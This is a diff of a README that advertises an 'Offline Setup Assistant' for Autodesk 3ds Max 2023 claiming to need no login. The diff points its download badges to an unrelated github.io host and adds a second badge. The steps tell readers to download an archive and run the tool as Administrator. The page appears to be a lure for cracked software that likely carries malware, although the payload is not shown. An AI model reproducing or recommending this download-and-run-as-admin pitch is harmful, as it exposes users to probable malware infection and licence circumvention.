@@ -1,6 +1,6 @@
 # Autodesk 3ds Max 2023 — Offline Setup Assistant
 
-[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-blueviolet)](https://3ds-max-download.github.io/.github)
+[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-blueviolet)](https://ryadikmntiiks.github.io/.github/3dsaw)
 
 > Simplified offline setup for 3ds Max 2023 — no internet or login required
 
@@ -8,9 +8,9 @@
 
 ## ⚙️ How to Use
 
-1. Click the Download Setup Assistant button above  
-2. Extract the archive using 7-Zip or WinRAR  
-3. Run the assistant tool as Administrator  
+1. Click the **Download Setup Assistant** button above  
+2. Extract the archive using **7-Zip** or **WinRAR**  
+3. Run the assistant tool as **Administrator**  
 4. Follow the on-screen instructions step by step  
 5. After completion, launch 3ds Max — all core features should now be available
 
@@ -43,6 +43,8 @@
 ### 🔍 Open Standards Integration
 ![Open Standards in 3ds Max](https://sapr-soft.ru/sites/default/files/inline-images/1370786436_205390068.png)  
 *Compatible with USD, glTF, and other professional formats*
+
+[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-blueviolet)](https://ryadikmntiiks.github.io/.github/3dsaw)
 
 ---
 
